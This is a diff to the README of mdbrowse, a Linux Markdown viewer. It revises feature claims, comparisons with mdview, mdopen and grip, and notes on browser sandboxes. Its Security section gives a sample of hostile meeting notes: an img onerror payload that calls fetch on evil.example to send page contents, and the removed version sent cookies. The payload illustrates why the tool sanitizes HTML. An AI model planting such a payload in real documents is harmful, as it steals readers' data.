@@ -19,7 +19,7 @@ The moment the same file is sitting **on your disk**, though:
   You wanted to *read* it, not edit it.
 - **Your browser** can't render Markdown. It shows you the raw text.
 - **Your IDE** renders it fine, but launching a full IDE to read one file is
-  driving to the next room.
+  like using a sledgehammer to crack a nut.
 
 What's missing is the most ordinary thing imaginable: a **viewer**. You have one
 for images. You have one for PDFs. For Markdown, you don't.
@@ -27,34 +27,38 @@ for images. You have one for PDFs. For Markdown, you don't.
 ## What mdbrowse does
 
 It registers itself as your default `.md` application. From then on you double-click
-any Markdown file and it opens **in your browser, rendered exactly like GitHub** —
+any Markdown file and it opens **in your browser, rendered in GitHub's style** —
 light and dark, tables, code blocks, images. Nothing more. You can't edit it, which
 is the point: you can't accidentally clobber it either.
 
-Four things it does that the alternatives don't:
+Four things that set it apart:
 
 **You can click through a whole tree of notes.** Got an index linking ten other
 files? The links work — targets are pre-rendered recursively and rewritten to point
-at each other, anchors included. Everything else opens one file and leaves you there.
+at each other, anchors included. Tools that just generate a page (like mdview) open one
+file and leave you there; the ones that let you click through (grip, mdopen) run a local
+server. mdbrowse does it without one.
 
 **A hostile document can't bite you.** Markdown is allowed to contain raw HTML. Download
-a `.md` from a stranger, double-click it, and on a `file://` origin someone else's
-JavaScript runs right next to your files. mdbrowse sanitizes the HTML before it reaches
-the page — the only one of the three comparable tools that does (verified in their
-source, not their README). See *Security* below.
+a `.md` from a stranger, double-click it, and someone else's JavaScript runs in your
+browser, with network access. mdbrowse sanitizes the HTML before it reaches the page —
+the only one of the compared local tools that does (verified in their source, not their
+README). See *Security* below.
 
-**Nothing to install, nothing to trust.** One bash script. No Python, no npm, no
-binary you have to take on faith — read the ~400 commented lines yourself. It never
-touches the network: no server, no API, no telemetry, ever.
+**No dependencies, nothing to trust.** One bash script. No Python, no npm, no
+binary you have to take on faith — read its ~500 lines (about a quarter of them
+comments) yourself. It never touches the network: no server, no API, no telemetry,
+ever.
 
-**It works where your browser can't reach.** If your browser came from Snap or Flatpak —
-which on Ubuntu, Fedora and Pop!_OS it probably did — it runs in a sandbox and **cannot
-read hidden directories**. Notes under `~/.config/` or `~/.notes/` simply won't open.
+**It works where your browser can't reach.** A browser from Snap — on Ubuntu that includes
+the default Firefox — runs in a sandbox and **isn't allowed into hidden folders** directly
+in your home directory. Notes under `~/.config/` or `~/.notes/` simply won't open.
 mdbrowse reads the file itself and writes the rendered page somewhere the sandbox *can*
-reach. You don't have to know any of this: `install.sh` detects it and sets it up.
+reach. You don't have to know any of this: mdbrowse detects it on every run.
 
-**Who it's not for.** You don't write in it, you read. No Mermaid diagrams, no math.
-Linux only. And the rendered page needs JavaScript enabled.
+**Who it's not for.** You don't write in it, you read. No syntax highlighting in code
+blocks, no Mermaid diagrams, no math. Linux only. And the rendered page needs
+JavaScript enabled.
 
 ## Alternatives
 
@@ -64,8 +68,8 @@ Worth naming, because they're good and you may well prefer them:
   GitHub-styled page in your browser, no server. It is packaged properly (AUR, deb, rpm, Snap),
   runs on macOS and Windows too, and it renders **Mermaid diagrams**, which mdbrowse does not.
 - **[mdopen](https://github.com/immanelg/mdopen)** (Rust) serves your files over a local HTTP
-  server with **hot reload**, syntax highlighting and math — nicer if you are *writing* and
-  want the page to refresh as you save.
+  server with **hot reload** (`--reload`), syntax highlighting and math — nicer if you are
+  *writing* and want the page to refresh as you save.
 - **grip** renders exactly like GitHub, but runs a local server and wants Python + the GitHub API.
 - **glow / mdcat** are terminal-only.
 - **Marker / Apostrophe / ghostwriter** are *editors* — heavy, and not what you want for a quick read.
@@ -104,9 +108,9 @@ tree of notes and always get rendered pages.
 
 **Untrusted Markdown is safe to open.** This matters more than it sounds. Markdown is
 allowed to contain raw HTML, and once mdbrowse is your `.md` handler, a double-click on
-a downloaded file renders it on a `file://` origin — next to your own files. `innerHTML`
-won't run a `<script>` tag, but it *will* fire event handlers, so a single `<img>` line
-is enough to execute someone else's JavaScript.
+a downloaded file renders it in your browser. `innerHTML` won't run a `<script>` tag,
+but it *will* fire event handlers, so a single `<img>` line is enough to execute
+someone else's JavaScript.
 
 Here is a document that looks like meeting notes:
 
@@ -118,17 +122,19 @@ Thanks for yesterday! A couple of points we covered:
 - deadline moved to Friday
 - budget approved
 
-<img src="logo.png" onerror="fetch('https://evil.example/steal?f='+document.cookie)">
+<img src="logo.png" onerror="fetch('https://evil.example/steal?d='+encodeURIComponent(document.body.innerText))">
 ```
 
 Skim it and you see notes with a company logo. But `logo.png` does not exist, so the
-`onerror` runs every time — and it can do anything: here it ships your data off to
-someone else's server. You never clicked anything except "open the file".
+`onerror` runs every time — and it has network access: here it ships the document's
+contents off to someone else's server. You never clicked anything except "open the file".
 
 **This is not hypothetical for the alternatives.** Both pass raw HTML straight through:
 [mdview](https://github.com/mapitman/mdview) does it deliberately (`html.WithUnsafe()`
-in `main.go`) and it *also* registers as your `.md` handler; mdopen renders with no
-sanitizer either. Open that file in one of them and the `fetch` fires.
+in `main.go`), and its Snap package offers itself as a `text/markdown` handler; mdopen
+renders with no sanitizer either. Open that file in one of them and the `fetch` fires.
+(grip comes out clean only because it sends your file to GitHub's API to render, and
+GitHub sanitizes.)
 
 mdbrowse runs everything through **DOMPurify** before it touches the DOM, so what
 actually reaches the page is:
@@ -177,12 +183,17 @@ mdbrowse --render-only f.md   # render only, print the HTML path (don't open)
 
 Normally `$XDG_CACHE_HOME/mdbrowse` (i.e. `~/.cache/mdbrowse`).
 
-**But if your default browser is a Snap or a Flatpak** — Brave, Chromium, Firefox on
-most current distros — it runs in a sandbox that **cannot read hidden directories**,
-and `~/.cache` is hidden. Handing such a browser a path it is not allowed to open is
+**But if your default browser is a Snap** (on Ubuntu that includes the default Firefox)
+it runs in a sandbox that **can't read hidden folders** directly in your home directory,
+and `~/.cache` is one. Handing such a browser a path it is not allowed to open is
 the one way this tool can fail while looking like it worked. So mdbrowse checks, and
 writes to the non-hidden `~/mdbrowse-cache` instead. You don't have to do anything; set
 `MDBROWSE_CACHE` only if you want the page somewhere specific.
+
+A Flatpak browser is detected the same way, but Flatpak sandboxes can be stricter —
+the browser may not see your home directory at all — so `~/mdbrowse-cache` may be out of
+reach too. That case is untested — if you hit it, point `MDBROWSE_CACHE` at a folder
+your browser can read, and please open an issue.
 
 ## Requirements
 
